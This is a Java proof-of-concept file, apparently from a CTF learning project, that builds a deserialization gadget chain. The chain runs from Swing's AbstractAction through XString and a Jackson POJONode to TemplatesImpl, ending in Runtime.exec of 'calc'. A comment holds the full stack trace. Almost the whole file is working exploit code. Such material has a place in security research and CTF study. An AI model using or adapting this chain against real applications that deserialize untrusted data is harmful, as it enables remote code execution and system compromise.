package com.javasec.pocs.jackson;
import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xpath.internal.objects.XString;
import javax.swing.*;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import java.lang.reflect.Field;

/**
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
 * serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
 * serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)
 * defaultSerializeValue:1148, SerializerProvider (com.fasterxml.jackson.databind)
 * serialize:115, POJONode (com.fasterxml.jackson.databind.node)
 * _serializeNonRecursive:105, InternalNodeMapper$WrapperForSerializer (com.fasterxml.jackson.databind.node)
 * serialize:85, InternalNodeMapper$WrapperForSerializer (com.fasterxml.jackson.databind.node)
 * serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
 * serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
 * _serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
 * serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
 * serialize:1572, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)
 * _writeValueAndClose:1273, ObjectWriter (com.fasterxml.jackson.databind)
 * writeValueAsString:1140, ObjectWriter (com.fasterxml.jackson.databind)
 * nodeToString:34, InternalNodeMapper (com.fasterxml.jackson.databind.node)
 * toString:238, BaseJsonNode (com.fasterxml.jackson.databind.node)
 * equals:392, XString (com.sun.org.apache.xpath.internal.objects)
 * firePropertyChange:273, AbstractAction (javax.swing)
 * putValue:211, AbstractAction (javax.swing)
 * readObject:364, AbstractAction (javax.swing)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:48, SerializeUtils (com.javasec.utils)
 * main:27, AbstractTemplatesChain (com.javasec.pocs.jackson)
 * 指定-javaagent:E:\CTFLearning\Java\JavaSec\AbstractActionAgent.jar
 */
public class AbstractTemplatesChain {
    public static void main(String[] args) throws Exception {
        SerializeUtils.OverideJackson();
        POJONode pojoNode = new POJONode(SerializeUtils.getTemplate("calc"));
        XString xstr = new XString("");
        StyledEditorKit.AlignmentAction action = SerializeUtils.createWithoutConstructor(StyledEditorKit.AlignmentAction.class);
        SerializeUtils.setFieldValue(action, "changeSupport", new SwingPropertyChangeSupport(""));
        action.putValue("p1", "");
        action.putValue("p2", "");
        Field tablefield = AbstractAction.class.getDeclaredField("arrayTable");
        tablefield.setAccessible(true);
        Object atable = tablefield.get(action);
        Field tablefield1 = atable.getClass().getDeclaredField("table");
        tablefield1.setAccessible(true);
        Object[] table1 = (Object[])tablefield1.get(atable);
        table1[1] = xstr;
        table1[3] = pojoNode;
        tablefield1.set(atable, table1);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(action));
    }
}
